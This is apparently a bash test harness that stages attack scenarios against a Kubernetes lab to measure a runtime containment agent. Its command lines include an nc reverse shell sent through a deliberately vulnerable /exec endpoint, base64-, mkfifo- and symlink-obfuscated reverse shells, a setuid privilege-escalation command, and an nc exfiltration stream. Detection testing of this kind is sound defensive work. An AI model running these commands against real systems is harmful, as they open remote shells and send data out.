#!/bin/bash
# =============================================================================
# ZTRE Advanced Outsider Attack Simulation Harness
# Implements doc/ADVANCED_TEST_PLAN.md v1.3.0
#
# Scenarios:
#   1. HTTP Ingress RCE (true outsider lineage: sh -> nc)
#   2. Multi-Stage Kill Chain (Green -> Yellow -> Red)
#   3. Living-Off-The-Land Evasion Matrix (base64 / mkfifo / symlink / awk)
#   4. Exfiltration Race Window measurement (Cilium convergence)
#
# Run from the BASTION (it drives kubectl + acts as the external attacker).
# =============================================================================
set -uo pipefail

# ---- Configuration -----------------------------------------------------------
NS="${NS:-ztre-test}"
AGENT_NS="${AGENT_NS:-ztre-system}"
AGENT_LABEL="app.kubernetes.io/name=ztre-agent"
WORKER_IP="${WORKER_IP:-10.91.128.11}"
BASTION_IP="${BASTION_IP:-10.91.128.10}"
NODEPORT="${NODEPORT:-30080}"
EXFIL_PORT="${EXFIL_PORT:-9999}"
EVIDENCE_DIR="${EVIDENCE_DIR:-evidence/advanced}"
TS="$(date +%Y%m%d-%H%M%S)"

# Resolve relative to the current directory's repo root and create it.
case "$EVIDENCE_DIR" in
  /*) : ;;
  *) EVIDENCE_DIR="$(pwd)/$EVIDENCE_DIR" ;;
esac
mkdir -p "$EVIDENCE_DIR"
LOG="$EVIDENCE_DIR/run-$TS.log"

# ---- Helpers -----------------------------------------------------------------
say()  { echo "$*" | tee -a "$LOG"; }
hdr()  { say ""; say "============================================================"; say "$*"; say "============================================================"; }

# Count containment events in agent logs since a given unix-second marker.
agent_logs() { kubectl logs -n "$AGENT_NS" -l "$AGENT_LABEL" --tail=2000 2>/dev/null; }
agent_since() { agent_logs | jq -rR 'fromjson? | select(.timestamp != null)' 2>/dev/null; }

get_pod() { kubectl get pod -n "$NS" -l "app=$1" -o jsonpath='{.items[0].metadata.name}' 2>/dev/null; }

is_quarantined() {
  kubectl get pod -n "$NS" -l "app=$1" -o jsonpath='{.items[0].metadata.labels.ztre\/quarantine}' 2>/dev/null | grep -q true
}

# Reset agent cache + target quarantine label. Accepts app label OR full pod name.
reset_agent_and_wait() {
  local target="$1"
  say "[reset] clearing quarantine label for: $target"
  kubectl label pod -n "$NS" -l "app=$target" ztre/quarantine- --overwrite >/dev/null 2>&1 || \
  kubectl label pod -n "$NS" "$target" ztre/quarantine- --overwrite >/dev/null 2>&1 || true

  say "[reset] restarting ztre-agent daemonset (clears sync.Map dedup cache)"
  kubectl rollout restart daemonset -n "$AGENT_NS" ztre-agent >/dev/null 2>&1
  kubectl rollout status daemonset -n "$AGENT_NS" ztre-agent --timeout=40s >/dev/null 2>&1 || true

  local timeout=20
  while [ "$timeout" -gt 0 ]; do
    if agent_logs | grep -q "Tetragon gRPC event stream established"; then
      say "[reset] agent gRPC stream confirmed open"
      break
    fi
    sleep 1
    timeout=$((timeout - 1))
  done
  sleep 2
}

# =============================================================================
# PHASE 0 — Pre-flight
# =============================================================================
hdr "PHASE 0: Pre-flight diagnostics"

for tool in curl jq kubectl python3; do
  command -v "$tool" >/dev/null 2>&1 || { say "[FAIL] $tool missing on bastion"; exit 1; }
done
say "[OK] bastion CLI tools present"

# Portable TCP listeners via python3 (bastion has no nc).
# tcp_catcher <port> <outfile|-> <seconds>: accept ONE connection, copy bytes.
tcp_catcher() {
  python3 - "$1" "$2" "$3" <<'PY'
import socket, sys
port, out, secs = int(sys.argv[1]), sys.argv[2], float(sys.argv[3])
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", port))
s.listen(5)
s.settimeout(secs)
try:
    conn, _ = s.accept()
    conn.settimeout(secs)
    f = open(out, "wb") if out != "-" else sys.stdout.buffer
    while True:
        try:
            data = conn.recv(65536)
        except socket.timeout:
            break
        if not data:
            break
        f.write(data); f.flush()
except socket.timeout:
    pass
finally:
    try: s.close()
    except Exception: pass
PY
}

# Reachability: bastion has no ping; use a TCP probe to the kube-apiserver NodePort or ssh.
if ssh -o BatchMode=yes -o ConnectTimeout=3 node2@"$WORKER_IP" true 2>/dev/null; then
  say "[OK] worker node $WORKER_IP reachable (ssh)"
else
  say "[WARN] ssh to worker $WORKER_IP failed; continuing (kubectl path may still work)"
fi

PORT_IN_USE=$(kubectl get svc -A -o jsonpath='{.items[*].spec.ports[*].nodePort}' 2>/dev/null | tr ' ' '\n' | grep -w "$NODEPORT" || true)
if [ -n "$PORT_IN_USE" ]; then
  OCCUPIER=$(kubectl get svc -A -o json 2>/dev/null | jq -r ".items[] | select(.spec.ports[]?.nodePort == $NODEPORT) | \"\(.metadata.namespace)/\(.metadata.name)\"")
  [ "$OCCUPIER" = "$NS/vulnerable-web" ] || { say "[FAIL] NodePort $NODEPORT occupied by $OCCUPIER"; exit 1; }
fi
say "[OK] NodePort $NODEPORT available/owned"

# Clear legacy quarantine labels across the namespace
kubectl label pod -n "$NS" --all ztre/quarantine- --overwrite >/dev/null 2>&1 || true
say "[OK] legacy quarantine labels cleared"

# =============================================================================
# PHASE 1 — Deploy vulnerable-web
# =============================================================================
hdr "PHASE 1: Deploy vulnerable-web workload"

if [ -f deploy/workloads/vulnerable-web.yaml ]; then
  kubectl apply -f deploy/workloads/vulnerable-web.yaml 2>&1 | tee -a "$LOG"
else
  say "[FAIL] deploy/workloads/vulnerable-web.yaml not found"; exit 1
fi

kubectl rollout status deployment/vulnerable-web -n "$NS" --timeout=60s 2>&1 | tee -a "$LOG" || true
WEB_POD=$(get_pod vulnerable-web)
say "[info] vulnerable-web pod: $WEB_POD"

# Wait for readiness probe
for i in $(seq 1 20); do
  R=$(kubectl get pod -n "$NS" "$WEB_POD" -o jsonpath='{.status.conditions[?(@.type=="Ready")].status}' 2>/dev/null)
  [ "$R" = "True" ] && break
  sleep 2
done
say "[info] vulnerable-web Ready=$R"

# Sanity: HTTP endpoint responds
RESP=$(curl -s --connect-timeout 5 "http://$WORKER_IP:$NODEPORT/exec?cmd=id" || true)
say "[sanity] HTTP response: $RESP"

# =============================================================================
# PHASE 2 — Scenario 1: HTTP Ingress RCE
# =============================================================================
hdr "PHASE 2: Scenario 1 - HTTP Ingress RCE"

reset_agent_and_wait vulnerable-web

# Reverse shell catcher on bastion (background, short-lived)
(tcp_catcher 4444 - 5 &) || true
sleep 1

say "[attack] firing reverse shell via HTTP ingress"
curl -s --connect-timeout 5 \
  "http://$WORKER_IP:$NODEPORT/exec?cmd=nc+$BASTION_IP+4444+-e+/bin/sh" >/dev/null 2>&1 || true
sleep 8

SC1_LABEL=$(kubectl get pod -n "$NS" "$WEB_POD" -o jsonpath='{.metadata.labels.ztre\/quarantine}' 2>/dev/null || true)
SC1_RESTARTS=$(kubectl get pod -n "$NS" "$WEB_POD" -o jsonpath='{.status.containerStatuses[0].restartCount}' 2>/dev/null || echo "?")
SC1_PHASE=$(kubectl get pod -n "$NS" "$WEB_POD" -o jsonpath='{.status.phase}' 2>/dev/null || echo "?")
SC1_LOG=$(agent_logs | jq -rR 'fromjson? | select(.msg=="AUTOMATED CONTAINMENT EXECUTED SUCCESSFULLY" and .pod=="'"$WEB_POD"'") | "score=\(.risk_score) latency=\(.latency)"' 2>/dev/null | tail -1)

say "[SC1] quarantine label : ${SC1_LABEL:-<none>}"
say "[SC1] pod phase        : $SC1_PHASE"
say "[SC1] restart count    : $SC1_RESTARTS"
say "[SC1] containment log  : ${SC1_LOG:-<none>}"
say "[SC1] PASS? $( [ "$SC1_LABEL" = "true" ] && [ "$SC1_RESTARTS" = "0" ] && echo YES || echo NO )"

# =============================================================================
# PHASE 3 — Scenario 2: Multi-Stage Kill Chain
# =============================================================================
hdr "PHASE 3: Scenario 2 - Multi-Stage Kill Chain"

reset_agent_and_wait vulnerable-web

say "[SC2-stage1] recon (expect YELLOW ~45; no GREEN tier under live model)"
curl -s "http://$WORKER_IP:$NODEPORT/exec?cmd=id" >/dev/null 2>&1 || true
curl -s "http://$WORKER_IP:$NODEPORT/exec?cmd=uname+-a" >/dev/null 2>&1 || true
curl -s "http://$WORKER_IP:$NODEPORT/exec?cmd=cat+/etc/hosts" >/dev/null 2>&1 || true
sleep 4
SC2_STAGE1=$(agent_logs | grep vulnerable-web | jq -rR 'fromjson? | select(.action=="LOG_AND_ALERT") | .risk_score' 2>/dev/null | tail -1)

say "[SC2-stage2] lateral probe (expect RED ~75)"
curl -s "http://$WORKER_IP:$NODEPORT/exec?cmd=wget+-q+-O+-+http://database:5432" >/dev/null 2>&1 || true
sleep 4
SC2_STAGE2=$(agent_logs | grep vulnerable-web | jq -rR 'fromjson? | select(.binary=="/usr/bin/wget") | .risk_score' 2>/dev/null | tail -1)

say "[SC2-stage3] privilege escalation (expect RED ~80)"
curl -s "http://$WORKER_IP:$NODEPORT/exec?cmd=chmod+%2Bs+/bin/sh" >/dev/null 2>&1 || true
sleep 6
SC2_STAGE3=$(agent_logs | grep vulnerable-web | jq -rR 'fromjson? | select(.binary=="/bin/chmod") | .risk_score' 2>/dev/null | tail -1)
SC2_LABEL=$(kubectl get pod -n "$NS" "$WEB_POD" -o jsonpath='{.metadata.labels.ztre\/quarantine}' 2>/dev/null || true)

say "[SC2] recon (LOG_AND_ALERT) score : ${SC2_STAGE1:-<none>} (expect ~45 YELLOW)"
say "[SC2] probe wget score          : ${SC2_STAGE2:-<none>} (expect ~75 RED)"
say "[SC2] exploit chmod score        : ${SC2_STAGE3:-<none>} (expect ~80 RED)"
say "[SC2] final quarantine label     : ${SC2_LABEL:-<none>}"
say "[SC2] PASS? $( [ "$SC2_LABEL" = "true" ] && echo YES || echo NO )"

# =============================================================================
# PHASE 4 — Scenario 3: LotL Evasion Matrix (direct exec on vulnerable-app)
# =============================================================================
hdr "PHASE 4: Scenario 3 - Living-Off-The-Land Evasion"

APP_POD=$(get_pod vulnerable-app)
[ -n "$APP_POD" ] || { say "[FAIL] vulnerable-app pod not found"; exit 1; }
say "[info] vulnerable-app pod: $APP_POD"

run_evasion() {
  local name="$1" cmd="$2"
  reset_agent_and_wait vulnerable-app
  say "[SC3-$name] executing: $cmd"
  kubectl exec -n "$NS" "$APP_POD" -- sh -c "$cmd" >/dev/null 2>&1 || true
  sleep 6
  local maxscore
  maxscore=$(agent_logs | jq -rR 'fromjson? | select(.risk_score != null) | .risk_score' 2>/dev/null | sort -n | tail -1)
  local quar
  quar=$(kubectl get pod -n "$NS" "$APP_POD" -o jsonpath='{.metadata.labels.ztre\/quarantine}' 2>/dev/null || true)
  say "[SC3-$name] max risk score observed: ${maxscore:-<none>}  quarantined: ${quar:-no}"
}

# 3A: base64 wrapper -> expect RED/contained
run_evasion "3A-base64" 'echo "bmMgMTAuOTEuMTI4LjEwIDQ0NDQgLWUgL2Jpbi9zaA==" | base64 -d | sh'

# 3B: mkfifo pipe -> expect YELLOW/evaded-auto-containment
run_evasion "3B-mkfifo" 'mkfifo /tmp/p 2>/dev/null; nc 10.91.128.10 4444 < /tmp/p | sh > /tmp/p 2>&1 & sleep 2; rm -f /tmp/p'

# 3C: symlink rename -> UNTESTABLE on BusyBox, expect exit 127
run_evasion "3C-symlink" 'ln -sf /usr/bin/nc /tmp/worker; /tmp/worker 10.91.128.10 4444 -e /bin/sh || echo "applet-not-found (expected)"'

# 3D: awk socket -> UNTESTABLE on BusyBox
run_evasion "3D-awk" 'awk "BEGIN{s=\"/inet/tcp/0/10.91.128.10/4444\"; print s}" || echo "awk-inet-unsupported (expected)"'

say "[SC3] evasion matrix complete"

# =============================================================================
# PHASE 5 — Scenario 4: Exfiltration Race Window
# =============================================================================
hdr "PHASE 5: Scenario 4 - Exfiltration Race Window"

TARGET_POD="$APP_POD"
reset_agent_and_wait vulnerable-app

RECV_FILE="$EVIDENCE_DIR/race_exfil-$TS.bin"
rm -f "$RECV_FILE"

say "[SC4] starting bastion listener on :$EXFIL_PORT"
tcp_catcher "$EXFIL_PORT" "$RECV_FILE" 35 &
RECV_PID=$!

T0=$(date +%s%3N)
say "[SC4] T0 (attack start) = $T0"

kubectl exec -n "$NS" "$TARGET_POD" -- sh -c "
  ( while true; do dd if=/dev/urandom bs=1024 count=20 2>/dev/null; sleep 0.1; done ) | nc $BASTION_IP $EXFIL_PORT &
  EXFIL_PID=\$!
  sleep 0.2
  chmod +s /bin/sh
  sleep 25
  kill \$EXFIL_PID 2>/dev/null || true
" >/dev/null 2>&1 &

LAST_SIZE=0; STALL_COUNT=0; LOOP_COUNT=0; T2=""
while kill -0 "$RECV_PID" 2>/dev/null; do
  CUR_SIZE=$( [ -f "$RECV_FILE" ] && wc -c < "$RECV_FILE" 2>/dev/null || echo 0 )
  if [ "$CUR_SIZE" -gt 0 ] && [ "$CUR_SIZE" -eq "$LAST_SIZE" ]; then
    STALL_COUNT=$((STALL_COUNT + 1))
    if [ "$STALL_COUNT" -ge 4 ]; then T2=$(date +%s%3N); kill "$RECV_PID" 2>/dev/null || true; break; fi
  else
    STALL_COUNT=0; LAST_SIZE="$CUR_SIZE"
  fi
  LOOP_COUNT=$((LOOP_COUNT + 1))
  if [ "$LOOP_COUNT" -ge 60 ]; then
    T2=$(date +%s%3N); kill "$RECV_PID" 2>/dev/null || true
    say "[SC4][WARN] watchdog timeout after 30s"; break
  fi
  sleep 0.5
done
[ -n "$T2" ] || T2=$(date +%s%3N)

T1_ISO=$(agent_logs | jq -rR 'fromjson? | select(.msg=="AUTOMATED CONTAINMENT EXECUTED SUCCESSFULLY") | .timestamp' 2>/dev/null | tail -1)
T1_LATENCY=$(agent_logs | jq -rR 'fromjson? | select(.msg=="AUTOMATED CONTAINMENT EXECUTED SUCCESSFULLY") | .latency' 2>/dev/null | tail -1)
[ -n "$T1_ISO" ] && T1_EPOCH=$(date -d "$T1_ISO" +%s%3N 2>/dev/null || echo "") || T1_EPOCH=""

BYTES_LEAKED=$( [ -f "$RECV_FILE" ] && wc -c < "$RECV_FILE" 2>/dev/null || echo 0 )
KB_LEAKED=$((BYTES_LEAKED / 1024))
ATTACK_WINDOW_MS=$((T2 - T0))

say "[SC4] T0 attack start      : $T0"
say "[SC4] T1 ZTRE patch (ISO)  : ${T1_ISO:-<none>}  (api latency ${T1_LATENCY:-?}s)"
say "[SC4] T2 cilium wire cut   : $T2"
say "[SC4] attack window (T2-T0): ${ATTACK_WINDOW_MS} ms"
if [ -n "$T1_EPOCH" ]; then
  say "[SC4] escape window (T2-T1): $((T2 - T1_EPOCH)) ms (clock-skew caveat)"
fi
say "[SC4] data leaked          : ${KB_LEAKED} KB (${BYTES_LEAKED} bytes)"

# =============================================================================
# PHASE 6 — Teardown & Export
# =============================================================================
hdr "PHASE 6: Teardown & export"

kubectl label pod -n "$NS" --all ztre/quarantine- --overwrite >/dev/null 2>&1 || true
say "[cleanup] quarantine labels cleared"

SUMMARY="$EVIDENCE_DIR/summary-$TS.json"
jq -n \
  --arg ts "$TS" \
  --arg sc1_label "${SC1_LABEL:-}" --arg sc1_phase "${SC1_PHASE:-}" --arg sc1_restarts "${SC1_RESTARTS:-}" \
  --arg sc2_recon "${SC2_STAGE1:-}" --arg sc2_probe "${SC2_STAGE2:-}" --arg sc2_exploit "${SC2_STAGE3:-}" --arg sc2_label "${SC2_LABEL:-}" \
  --arg sc4_bytes "${BYTES_LEAKED:-0}" --arg sc4_kb "${KB_LEAKED:-0}" --arg sc4_window "${ATTACK_WINDOW_MS:-0}" \
  '{timestamp:$ts, scenario1:{quarantine_label:$sc1_label,phase:$sc1_phase,restarts:$sc1_restarts}, scenario2:{recon_score:$sc2_recon,probe_score:$sc2_probe,exploit_score:$sc2_exploit,quarantine_label:$sc2_label}, scenario4:{bytes_leaked:$sc4_bytes,kb_leaked:$sc4_kb,attack_window_ms:$sc4_window}}' \
  > "$SUMMARY"

say "[export] summary written: $SUMMARY"
say "[export] exfil dump     : $RECV_FILE"
say "[export] full log       : $LOG"
hdr "DONE"
